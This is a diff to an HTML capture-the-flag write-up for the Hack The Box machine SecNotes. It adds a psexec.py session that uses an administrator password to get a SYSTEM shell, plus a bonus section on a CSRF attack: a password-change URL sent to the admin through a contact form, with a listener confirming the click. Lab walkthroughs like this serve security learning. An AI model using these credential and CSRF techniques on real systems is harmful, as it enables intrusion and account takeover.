@@ -11,7 +11,16 @@ title: SecNotes
 
 <p>This box is almost all about enumerating. To obtain a shell it's necessary to exploit a SQLi vulnerability and, once in, to elevate privileges we will need to play with a new functionality of Windows, Linux subsystems.</p> 
 
-<h2>Enumeration</h2>
+<div class="flexcontainer">
+    <a class="link-box" href="#enumeration">Enumeration</a>
+    <a class="link-box" href="#explotation">Explotation</a>
+    <a class="link-box" href="#privesc">Privilege Escalation</a>
+    <a class="link-box" href="#bonus">Bonus</a>
+</div>
+
+<hr>
+
+<h2 id="enumeration">Enumeration</h2>
 
 <p>First run an nmap listing versions and executing default scripts.</p>
 
@@ -145,7 +154,7 @@ tyler:$2y$10$IMZPI.99fAPmsvGi0KWaJ.8pakoHDfobENhzx4Kwbb/7OpvFXaQt.
 
 <img class="img-fluid" src="/static/img/htb/secnotes/8.png">
 
-<h2>Explotation</h2>
+<h2 id="explotation">Explotation</h2>
 
 <p>Connect to the specified share and see that we have write permissions in there.</p>
 
@@ -204,7 +213,7 @@ type user.txt
 <span flag="6fa7556968052a83183fb8099cb904f3">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span>
 </pre>
 
-<h2>Privilege escalation</h2>
+<h2 id="privesc">Privilege escalation</h2>
 
 <p>Looking through the machine directories, we can found something under Distros folder, which looks like an Ubuntu subsystem.</p>
 
@@ -298,3 +307,59 @@ smb: \Users\Administrator\Desktop\> exit
 root@kali:~/htb/secnotes# cat root.txt 
 <span flag="7250cde1cab0bbd93fc1edbdc83d447b">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span>
 </pre>
+
+<p>To get a full shell as administrator we can use <code>psexec.py</code> from <code>impacket</code>.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/secnotes# /opt/impacket/examples/psexec.py administrator@10.10.10.97
+Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies
+
+Password: u6!4ZwgwOM#^OBf#Nwnh
+[*] Requesting shares on 10.10.10.97.....
+[*] Found writable share ADMIN$
+[*] Uploading file yQKiefXS.exe
+[*] Opening SVCManager on 10.10.10.97.....
+[*] Creating service YhMW on 10.10.10.97.....
+[*] Starting service YhMW.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17134.228]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\WINDOWS\system32>whoami
+nt authority\system
+</pre>
+
+<h2 id="bonus">Bonus</h2>
+
+<p>After reading some write-ups of this machine I found the intended way to get user wasn't the SQL injection, instead you had to use a Cross-Site Request Forgery (CSRF) attack.</p>
+
+<p>On the first website there's an option to update your password.</p>
+
+<img class="img-fluid" src="/static/img/htb/secnotes/9.png">
+
+<p>This form is executing the following POST request.</p>
+
+<img class="img-fluid" src="/static/img/htb/secnotes/10.png">
+
+<p>But this GET request does the same thing.</p> 
+
+<p><code>http://10.10.10.97/change_pass.php?password=zurullo&confirm_password=zurullo&submit=submit</code></p>
+
+<p>We want the admin to execute it and then its password will be changed to what we have specified.</p>
+
+<p>To do that we will use the contact form on the same website inciting the user to click on it. We have also included a link to our machine, just to know when the user has clicked.</p>
+
+<img class="img-fluid" src="/static/img/htb/secnotes/11.png">
+
+<p>If we have been listening, we would get a GET request to the specified link. Now we know the user has clicked the links.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/secnotes# python -m SimpleHTTPServer 80
+Serving HTTP on 0.0.0.0 port 80 ...
+10.10.10.97 - - [22/Jan/2019 10:41:20] code 404, message File not found
+10.10.10.97 - - [22/Jan/2019 10:41:20] "GET /someoneclicked HTTP/1.1" 404 -
+</pre>
+
+<p>Enter as tyler and the password specified on the CSRF link and we can see the credentials to enter the SMB share.</p>
+
+<img class="img-fluid" src="/static/img/htb/secnotes/12.png">
